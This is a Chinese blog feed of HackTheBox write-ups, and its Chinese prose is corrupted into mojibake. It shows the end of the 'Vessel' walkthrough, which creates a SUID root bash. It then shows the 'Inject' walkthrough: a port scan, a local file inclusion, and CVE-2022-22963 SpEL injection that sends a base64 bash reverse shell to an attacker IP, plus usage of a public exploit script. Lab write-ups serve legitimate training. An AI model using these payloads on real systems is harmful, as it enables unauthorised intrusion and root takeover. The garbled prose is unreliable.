<p>å‘<code>/dev/shm/exp.sh</code>å†™å…¥æƒ³è¦æ‰§è¡Œçš„ä»£ç ï¼ˆæ­¤å¤„å°±æ˜¯æŠŠ<code>/bin/bash</code>å¤åˆ¶åˆ°<code>/tmp/wa0er</code>ï¼Œå¹¶ç»™äºˆ<code>4755</code>æƒé™ï¼Œä¹Ÿå°±æ˜¯suidå’Œ755æƒé™ï¼‰ï¼Œå¹¶ç»™<code>/dev/shm/exp.sh</code>æ·»åŠ æ‰§è¡Œæƒé™</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ethan@vessel:~$ echo -e '#!/bin/bash\ncp /bin/bash /tmp/wa0er\nchown root:root /tmp/wa0er\nchmod 4755 /tmp/wa0er' | tee /dev/shm/exp.sh
#!/bin/bash
cp /bin/bash /tmp/wa0er
chown root:root /tmp/wa0er
chmod 4755 /tmp/wa0er

ethan@vessel:~$ chmod +x /dev/shm/exp.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‰§è¡Œsleepå‘½ä»¤ï¼Œå¹¶ç”¨<code>killall</code>ç»ˆæ­¢è¿›ç¨‹ï¼Œ<code>-s SIGSEGV</code>è¡¨ç¤ºè®¿é—®æœªåˆ†é…ç»™è‡ªå·±çš„å†…å­˜ï¼Œæ­¤å¤„å¯çœ‹åˆ°å›æ˜¾(core dumped)ï¼Œå³è¿›å…¥å†…æ ¸è½¬å‚¨</p>
<pre class="line-numbers language-none"><code class="language-none">ethan@vessel:~$ sleep 100&amp;
[1] 1676

ethan@vessel:~$ killall -s SIGSEGV sleep
[1]+  Segmentation fault      (core dumped) sleep 100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æŸ¥çœ‹<code>/tmp/wa0er</code>æ–‡ä»¶æƒé™ï¼Œå·²æœ‰suidæƒé™</p>
<pre class="line-numbers language-none"><code class="language-none">ethan@vessel:~$ ls -l /tmp/wa0er
-rwsr-xr-x 1 root root 1183448 Mar 27 13:07 /tmp/wa0er<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æ‰§è¡Œ<code>/tmp/wa0er -p</code>ææƒï¼ŒæˆåŠŸè·å–rootæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327211815596.png"></p>
<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327210944263.png" style="zoom: 67%;">

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/qq_45894840/article/details/127844085">https://blog.csdn.net/qq_45894840/article/details/127844085</a></p>
<p><a href="https://0xdf.gitlab.io/2023/03/25/htb-vessel.html">https://0xdf.gitlab.io/2023/03/25/htb-vessel.html</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>gitä¿¡æ¯æ³„éœ²</tag>
        <tag>Nodejs-SQLæ³¨å…¥</tag>
        <tag>Pythonåç¼–è¯‘</tag>
        <tag>CVE-2022-24637ï¼ˆOpenWebAnalyticsï¼‰</tag>
        <tag>CVE-2022-0811ï¼ˆå†…æ ¸ææƒï¼‰</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Inject</title>
    <url>/posts/89e1a3f1.html</url>
    <content><![CDATA[<h1 id="HTB-Inject"><a href="#HTB-Inject" class="headerlink" title="HTB-Inject"></a>HTB-Inject</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><ol>
<li>ç«¯å£æ‰«æå‘ç°8080é¡µé¢å­˜åœ¨ä¸Šä¼ ç‚¹ï¼›</li>
<li>ä¸Šä¼ æ–‡ä»¶è·¯å¾„å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼›</li>
<li>æœ¬åœ°æ–‡ä»¶åŒ…å«è¯»å–ç«™ç‚¹<code>pom.xml</code>æ–‡ä»¶å‘ç°Spring Cloud Functionç‰ˆæœ¬å­˜åœ¨SpELæ³¨å…¥ï¼›</li>
<li>SpELæ³¨å…¥åå¼¹shellè·å–<code>frank</code>ç”¨æˆ·æƒé™ï¼›</li>
<li><code>frank</code>ç”¨æˆ·ç›®å½•ä¿¡æ¯æ³„éœ²è·å–<code>phil</code>ç”¨æˆ·ï¼›</li>
<li><code>phil</code>ç”¨æˆ·è‡ªåŠ¨ä»»åŠ¡<code>Ansible Playbook</code>ææƒè·å–rootæƒé™ã€‚</li>
</ol>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>Nmap</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -p- --min-rate 10000 10.10.11.204 
Starting Nmap 7.91 ( https://nmap.org ) at 2023-04-03 02:45 EDT
Nmap scan report for 10.10.11.204
Host is up (7.6s latency).
Not shown: 53331 filtered ports, 12202 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 49.25 seconds

â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -sCV -p 22,8080 10.10.11.204
Starting Nmap 7.91 ( https://nmap.org ) at 2023-04-03 02:50 EDT
Nmap scan report for 10.10.11.204
Host is up (0.37s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.02 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¼€æ”¾ç«¯å£ï¼š22ï¼ˆsshï¼‰ã€8080ï¼ˆhttp-proxyï¼‰</p>
<p>è®¿é—®<code>8080</code>ç«¯å£</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403145949424.png"></p>
<p>ç‚¹å‡»å³ä¸Šè§’<code>Upload</code>ï¼Œå­˜åœ¨ä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ phpæ–‡ä»¶æç¤º<code>Only image files are accepted!</code></p>
<p>å†æ¬¡ä¸Šä¼ ï¼ŒåŒæ—¶BurpæŠ“åŒ…ï¼Œä¿®æ”¹è¯·æ±‚åŒ…ä¸¤å¤„<code>filename="1.jpg"</code>ã€<code>Content-Type: image/jpeg</code>ï¼ŒæˆåŠŸä¸Šä¼ ï¼Œå“åº”è¿”å›è·¯å¾„<code>/show_image?img=1.jpg</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403150947720.png"></p>
<h2 id="ä¸‰ã€LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰"><a href="#ä¸‰ã€LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰" class="headerlink" title="ä¸‰ã€LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰"></a>ä¸‰ã€LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰</h2><p>æµè§ˆå™¨è®¿é—®<code>http://10.10.11.204:8080/show_image?img=1.jpg</code>ï¼ŒåŒæ—¶æŠ“åŒ…ï¼Œä¿®æ”¹<code>img=../../../</code>æµ‹è¯•LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰ï¼Œå¯çœ‹åˆ°å“åº”è¿”å›ç›®å½•æ–‡ä»¶ï¼Œç¡®å®šå­˜åœ¨LFI</p>
<p>æ–‡ä»¶åŒ…å«ï¼š<a href="https://www.freebuf.com/articles/web/277756.html">https://www.freebuf.com/articles/web/277756.html</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403152628018.png"></p>
<p>éå†å‘ç°<code>img=../../../../../../</code>æ˜¯æ ¹ç›®å½•ï¼Œ<code>img=../../../</code>å°±æ˜¯Webé¡µé¢æ ¹ç›®å½•ï¼ˆæˆ–<code>img=../../../../../../var/www/WebApp</code>ï¼‰</p>
<p>è¯»å–<code>pom.xml</code>æ–‡ä»¶</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
	<span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.6.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>relativePath</span><span class="token punctuation">/&gt;</span></span> <span class="token comment">&lt;!-- lookup parent from repository --&gt;</span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>WebApp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>0.0.1-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>WebApp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Demo project for Spring Boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.version</span><span class="token punctuation">&gt;</span></span>11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.version</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.sun.activation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>javax.activation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
  			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-devtools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>runtime<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>optional</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>optional</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-function-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.2.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.webjars<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>bootstrap<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>5.1.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.webjars<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>webjars-locator-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${parent.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>finalName</span><span class="token punctuation">&gt;</span></span>spring-webapp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>finalName</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="å››ã€CVE-2022-22963ï¼ˆSpring-Cloud-Function-SpELæ³¨å…¥ï¼‰"><a href="#å››ã€CVE-2022-22963ï¼ˆSpring-Cloud-Function-SpELæ³¨å…¥ï¼‰" class="headerlink" title="å››ã€CVE-2022-22963ï¼ˆSpring Cloud Function SpELæ³¨å…¥ï¼‰"></a>å››ã€CVE-2022-22963ï¼ˆSpring Cloud Function SpELæ³¨å…¥ï¼‰</h2><p>å…³é”®ä»£ç å¦‚ä¸‹ï¼Œç‰ˆæœ¬3.2.2ï¼Œå­˜åœ¨Spring Cloud Function SpEL ä»£ç æ³¨å…¥ï¼ˆCVE-2022-22963ï¼‰</p>
<p>åˆ†æï¼š<a href="https://www.anquanke.com/post/id/280278">https://www.anquanke.com/post/id/280278</a></p>
<p>åˆ©ç”¨ï¼š<a href="https://blog.csdn.net/qq_44842234/article/details/125845459">https://blog.csdn.net/qq_44842234/article/details/125845459</a></p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-function-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.2.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>åˆ©ç”¨æ–¹æ³•1</strong></p>
<p>åœ¨å¦‚ä¸‹ç½‘ç«™å¡«å†™åå¼¹shellå‘½ä»¤ï¼Œå¾—åˆ°base64å¤„ç†åçš„å‘½ä»¤</p>
<p><a href="https://bewhale.github.io/tools/encode.html">https://bewhale.github.io/tools/encode.html</a></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403174954186.png" style="zoom: 80%;">

<p>å…ˆæœ¬åœ°æ‰§è¡Œ<code>nc -lvnp 9898</code>å¼€å¯ncç›‘å¬</p>
<p>æµè§ˆå™¨è®¿é—®<code>http://10.10.11.204:8080/functionRouter</code>ï¼ŒåŒæ—¶BurpæŠ“åŒ…ï¼Œ<code>Send to Repeater</code>ä¹‹ååœ¨<code>Reapeter</code>å³é”®é€‰æ‹©<code>Change request method</code>ï¼Œæ­¤æ—¶GETè¯·æ±‚å˜æˆPOSTè¯·æ±‚ï¼Œç„¶åæ·»åŠ å¦‚ä¸‹è¯·æ±‚å¤´ï¼Œå‘åŒ…</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Lzk4OTggMD4mMQ==}|{base64,-d}|{bash,-i}")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403174347393.png"></p>
<p>æˆåŠŸåå¼¹shellï¼Œè·å–frankç”¨æˆ·æƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403175821863.png"></p>
<p><strong>åˆ©ç”¨æ–¹æ³•2</strong></p>
<p>ä¸‹è½½åˆ©ç”¨è„šæœ¬åˆ°æœ¬åœ°</p>
<p>åˆ©ç”¨è„šæœ¬ï¼š<a href="https://github.com/chaosec2021/EXP-POC/tree/main/Spring-cloud-function-SpEL-RCE">https://github.com/chaosec2021/EXP-POC/tree/main/Spring-cloud-function-SpEL-RCE</a></p>
<p>å…ˆæœ¬åœ°æ‰§è¡Œ<code>nc -lvnp 9898</code>å¼€å¯ncç›‘å¬</p>
<p>æœ¬åœ°æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">python3 Spel_RCE_Bash_EXP.py http://10.10.11.204:8080 10.10.16.9 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403173316806.png"></p>
<p>æˆåŠŸåå¼¹shellï¼Œè·å–frankç”¨æˆ·æƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403173329047.png"></p>
<p>ç”¨å¦‚ä¸‹findå‘½ä»¤æŸ¥çœ‹frankå±ç»„çš„æ–‡ä»¶ï¼Œä¸”è¿‡æ»¤æ‰å¸¦æœ‰<code>proc</code>å­—ç¬¦ä¸²çš„è¡Œï¼ˆå› ä¸º<code>/proc</code>ç›®å½•ä¸‹å¤ªå¤šæ— ç”¨çš„ç›¸å…³æ–‡ä»¶ï¼‰</p>
